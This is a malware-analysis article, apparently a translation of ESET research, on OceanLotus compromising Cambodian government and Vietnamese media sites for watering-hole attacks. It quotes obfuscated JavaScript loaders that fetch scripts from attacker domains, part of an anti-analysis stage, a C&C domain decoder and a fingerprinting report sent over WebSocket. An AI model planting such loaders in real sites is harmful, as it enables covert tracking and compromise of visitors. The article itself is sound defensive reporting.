<div class="post__text post__text-html js-mediator-article">  ESET experts performed an analysis of the new watering hole campaign, which targets several sites in Southeast Asia.  Presumably attackers operate from the beginning of September 2018.  The campaign is different in scale - we managed to find 21 compromised resources, including the websites of the Ministry of Defense of Cambodia, the Ministry of Foreign Affairs and International Cooperation of Cambodia, as well as several Vietnamese newspapers and blogs. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div><br>  Following the analysis, we found that the campaign is being carried out by the <a href="https://www.welivesecurity.com/wp-content/uploads/2018/03/ESET_OceanLotus.pdf">OceanLotus</a> group, also known as <a href="https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html">ART32</a> and ART-C-00.  The group has been operating since at least <a href="http://blogs.360.cn/post/oceanlotus-apt.html">2012</a> and specializes in cyber espionage, with a particular interest in government institutions and dissidents. <br><br><a name="habracut"></a>  It seems that the campaign is an evolution of the watering hole of the OceanLotus scheme, which Volexity researchers <a href="https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/">documented</a> in 2017 called Framework B. Since last year, the cyber group has learned to make it difficult to analyze their malicious frameworks.  Among other improvements, we noted the use of public key encryption for exchanging the AES session key.  The method is used to encrypt data exchange, preventing security products from intercepting the final payload.  In addition, the attackers switched from HTTP to WebSocket to hide malicious data exchange. <br><br>  Each of the compromised sites found by ESET specialists redirected visitors to a separate domain controlled by OceanLotus. <br><br>  The figure below shows the target regions of the campaign. <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>Figure 1. Geography of compromised sites</i> <br><br>  Most of the compromised domains are news media or related to the government of Cambodia.  Below is a list of victims.  We warned them about the compromise in October, but at the end of 2018 malicious scripts remained on some of the sites: <br><br>  - baotgm [.] Net - Vietnamese media (headquartered in Arlington, Texas) <br>  - cnrp7 [.] Org - site of the National Salvation Party of Cambodia <br>  - conggiaovietnam [.] Net - content of a religious nature in Vietnamese <br>  - daichungvienvinhthanh [.] Com - content of a religious nature in Vietnamese <br>  - danchimviet [.] Info - Vietnamese media <br>  - danviet [.] Vn - Vietnamese media <br>  - danviethouston [.] Com - Vietnamese media <br>  - fvpoc [.] Org - Vietnamese non-governmental organization <br>  - gardencityclub [.] Com - the site of the golf club in Phnom Penh, Cambodia <br>  - lienketqnhn [.] Org - Vietnamese media <br>  - mfaic.gov [.] Kh - Ministry of Foreign Affairs and International Cooperation of Cambodia <br>  - mod.gov [.] Kh - Ministry of Defense of Cambodia <br>  - mtgvinh [.] Net - content of a religious nature in Vietnamese <br>  - nguoitieudung.com [.] Vn - Vietnamese media <br>  - phnompenhpost [.] Com - Cambodian media in English <br>  - raovatcalitoday [.] Com - Vietnamese site <br>  - thongtinchongphandong [.] Com - opposition media in Vietnamese <br>  - tinkhongle [.] Com - Vietnamese media <br>  - toithichdoc.blogspot [.] Com - Vietnamese blog <br>  - trieudaiviet [.] Com - Vietnamese site <br>  - triviet [.] News - Vietnamese media <br><br>  In watering hole attacks, attackers tend to compromise sites that are frequently visited by potential victims.  However, OceanLotus has compromised several popular sites in this campaign.  Below is a list of compromised sites and their <a href="https://www.alexa.com/siteinfo">Alexa rating</a> : global and in the country where the site is most popular.  For example, the site of the newspaper Dan Viet (danviet [.] Vn) at the end of 2018 was on line 116 in attendance in Vietnam. <br><br>  - danviet [.] Vn - 12 887/116 <br>  - phnompenhpost [.] Com - 85 910/18 880 <br>  - nguoitieudung.com [.] Vn - 261 801/2 397 <br>  - danchimviet [.] Info - 287 852/144 884 <br>  - baotgm [.] Net - 675 669/119 737 <br>  - toithichdoc.blogspot [.] Com - 700 470/11532 <br>  - mfaic.gov [.] Kh - 978 165/2 149 <br>  - conggiaovietnam [.] Net - 1 040 548/15 368 <br>  - thongtinchongphandong [.] Com - 1 134 691/21 575 <br>  - tinkhongle [.] Com - 1 301 722/15 224 <br>  - daichungvienvinhthanh [.] Com - 1 778 418/23 428 <br>  - mod.gov [.] Kh - 4,247,649 / 3,719 <br><br><h3>  Analysis </h3><br>  For all compromised sites used similar methods.  The attackers added a small fragment of JavaScript code to the main page, or to a JavaScript file that was uploaded on the same server.  A slightly obfuscated code snippet (see below) loads another script from the server controlled by the attacker.  Below is a javascript fragment added to <code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code> , which loads the file from <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> . <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br>  To avoid detection, the attackers took the following measures: <br><br>  - They obfuscate scripts to prevent static final URL from being allocated <br>  - the URL looks like the actual javascript library used by the site <br>  - For each compromised site uses a separate domain and URI <br>  - All compromised sites have different scripts.  Below is a script injected into one of the compromised sites: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3>  First stage </h3><br>  Depending on the location of the IP address of the visitor, the server of the first stage (for example, <code>weblink.selfip[.]info</code> for <code>mfaic.gov[.]kh</code> ), sends a false script (random legitimate JavaScript library), or a script of the first stage (for example, SHA- 1: 2194271C7991D60AE82436129D7F25C0A689050A).  Not all servers are checked for location, but if there is one, only visitors from Vietnam and Cambodia receive a malicious script. <br><br>  The first stage script has several checks to prevent detection, as shown below. <br><br><pre> <code class="javascript hljs">[…] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } […]</code> </pre> <br>  The script waits until the victim reaches the page.  It also checks the window resolution and whether Firebug, a browser plug-in for analyzing web pages, is enabled.  If at least one of the checks fails, the execution is terminated. <br><br>  He then decrypts the domain of the command C &amp; C server using a custom algorithm.  For example, 3B37371M1B1B382R332V1A382W36392W2T362T1A322T38 stands for <code>wss://tcog.thruhere[.]net</code> .  For each domain of the first stage, the attackers additionally registered the domain of the second stage, and all of them are located on different servers.  The code below is the equivalent of a decryption function written in Python. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br>  After deciphering the C &amp; C address, the script sends a unique string of 15 digits, and then the second stage script receives and executes.  Data exchange is carried out via WebSocket or SSL.  The protocol provides simultaneous two-way communication between the client and the server.  This means that after the client establishes the connection, the server can send data to the client even without a request.  However, in a particular case, the protocol is used primarily to avoid detection. <br><br><h3>  Second phase </h3><br>  The script of the second stage is designed for intelligence.  OceanLotus developers used Valve's fingerprintjs2 library, available on <a href="https://github.com/Valve/fingerprintjs2/tree/a5ea808a9e1ce1646716332d1660a2c74c765336">GitHub</a> , with a few changes - by adding network data sharing and creating a special report. <br><br>  The figure below shows the various actions performed by the script.  Communication takes place via the WebSocket session, which was started by the first step. <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>Figure 2. Scheme of the second stage payload</i> <br><br>  The communication is encrypted using the AES session key generated by the server.  It is encrypted with a 1024-bit RSA public key and sent to the client, so it is not possible to decrypt the data exchange between the client and the server. <br><br>  Compared to previous versions of the OceanLotus watering hole framework, it is more difficult to protect against this, since data transmission over the network cannot be detected and decrypted.  This prevents network discovery of data.  The public key transmitted by the server does not change and is listed in the IoC section. <br><br>  The reconnaissance script creates a report similar to the one below and sends it to the second stage C &amp; C server. <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br>  This report is almost identical to the other that is generated by the <a href="">OceanLotus Framework B</a> , documented by Volexity experts in 2017.  Their sections are similar and contain identical typos.  Due to this similarity and location of goals, we can say with a high degree of confidence that the campaign is being conducted by OceanLotus. <br><br>  The generated report contains detailed information about the victim’s browser and the visited site: user agent, HTTP Referer request header, local and external IP-address, plug-ins and set browser language settings. <br><br>  In addition, each machine has two unique identifiers: <i>client_zuuid</i> and <i>client_uuid</i> .  Perhaps they are used to identify users and track their visits.  These identifiers, in fact, were present in the 2017 version of the framework, and <i>client_uuid was</i> calculated in a similar way. <br><br>  The <i>client_zuuid</i> value is the concatenation of various deviceId values ​​contained in navigator.mediaDevices.enumerateDevices.  Devices — External devices that the browser has access to, such as cameras and microphones.  Thus, the value for one user must match during different visits from the same computer. <br><br>  The <i>client_uuid</i> value is the MD5 hash of digital fingerprints allocated by fingerprintjs2.  The data collected includes a browser user agent, language, time zone, browser plugins, and fonts available to the browser.  And again - the value should be identical for all visits, only if, for example, the user does not update the browser or log in from another device. <br><br>  Finally, the server can send additional JavaScript code to the victim's computer, perhaps this is the delivered component.  Unfortunately, due to the use of the AES session key to decrypt the data exchange, we could not determine which component was delivered by the attackers in the in-the-wild samples.  In addition, the payload is delivered only to certain victims.  Thus, using a test machine, we could not get them.  However, according to previous reports, the watering hole campaigns of the OceanLotus group are aimed at phishing.  For example, Volexity in the report <a href="">wrote</a> that users saw a pop-up window asking for authorization to access the Google account of the victim for the OceanLotus Google App via the open OAuth protocol.  With this technique, attackers can get to the victim’s contacts and emails. <br><br><h3>  Network infrastructure </h3><br>  For the most secretive work, OceanLotus operators registered one domain for the first and second stages for each of the compromised sites.  Each domain is hosted on a separate server with its own IP address.  At least 50 domains and 50 servers have been registered for this campaign. <br><br>  Most domains of the first stage are registered on services with free domain names, domains of the second stage are mainly paid.  In addition, their names are disguised as legitimate.  Below is a list of services that attackers tried to copy - C &amp; C and the legitimate domain, respectively: <br><br>  - cdn-ampproject [.] Com / cdn.ampproject.com <br>  - bootstraplink [.] Com / getbootstrap.com <br>  - sskimresources [.] Com / s.skimresources.com <br>  - widgets-wp [.] Com / widgets.wp.com <br><br>  The number of domains used and their similarity to legitimate sites may complicate the detection of a person viewing network traffic. <br><br><h3>  Conclusion </h3><br>  Despite the attention of security researchers, OceanLotus continues to successfully attack targets in Southeast Asia.  In addition, the group is improving the toolkit, including in the arsenal of the framework for watering hole attacks, malware for Windows and macOS.  Recent framework updates reviewed in this report indicate that attackers have upgraded their skills. <br><br>  To limit the number of possible victims, we notified the owners of compromised sites and explained how to remove malicious JavaScript code.  However, some of them did not show readiness to accept information and assistance. <br><br>  ESET researchers will continue to monitor the development of the OceanLotus group.  Indicators of compromise can be found on <a href="https://github.com/eset/malware-ioc/tree/master/OceanLotus">GitHub</a> . </div>